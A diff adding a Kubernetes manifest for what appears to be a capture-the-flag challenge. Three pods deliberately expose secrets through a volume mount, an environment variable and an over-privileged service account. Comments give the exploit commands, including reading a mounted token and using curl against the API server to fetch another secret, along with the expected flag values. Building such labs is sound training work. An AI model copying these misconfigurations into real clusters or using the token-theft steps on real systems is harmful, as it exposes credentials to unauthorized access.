@@ -1,0 +1,59 @@
+---
+# pod1: secret1 mounted as a volume at /etc/secret-volume/
+# Exploit: kubectl exec pod1 -- cat /etc/secret-volume/password → "you-are"
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod1
+  namespace: restricted
+spec:
+  containers:
+  - name: pod1
+    image: alpine:3.18
+    command: ["sh", "-c", "sleep infinity"]
+    volumeMounts:
+    - name: secret1-vol
+      mountPath: /etc/secret-volume
+      readOnly: true
+  volumes:
+  - name: secret1-vol
+    secret:
+      secretName: secret1
+
+---
+# pod2: secret2 exposed via environment variable PASSWORD
+# Exploit: kubectl exec pod2 -- env | grep PASSWORD → "an-amazing"
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod2
+  namespace: restricted
+spec:
+  containers:
+  - name: pod2
+    image: alpine:3.18
+    command: ["sh", "-c", "sleep infinity"]
+    env:
+    - name: PASSWORD
+      valueFrom:
+        secretKeyRef:
+          name: secret2
+          key: password
+
+---
+# pod3: uses the secret-reader ServiceAccount which has get/list on secrets
+# Exploit: exec into pod3, use the mounted SA token to curl the k8s API for secret3
+# kubectl exec pod3 -- curl -sk -H "Authorization: Bearer $(cat /run/secrets/.../token)" \
+#   https://kubernetes.default/api/v1/namespaces/restricted/secrets/secret3
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod3
+  namespace: restricted
+spec:
+  serviceAccountName: secret-reader
+  automountServiceAccountToken: true
+  containers:
+  - name: pod3
+    image: alpine/curl:8.5.0
+    command: ["sh", "-c", "sleep infinity"]
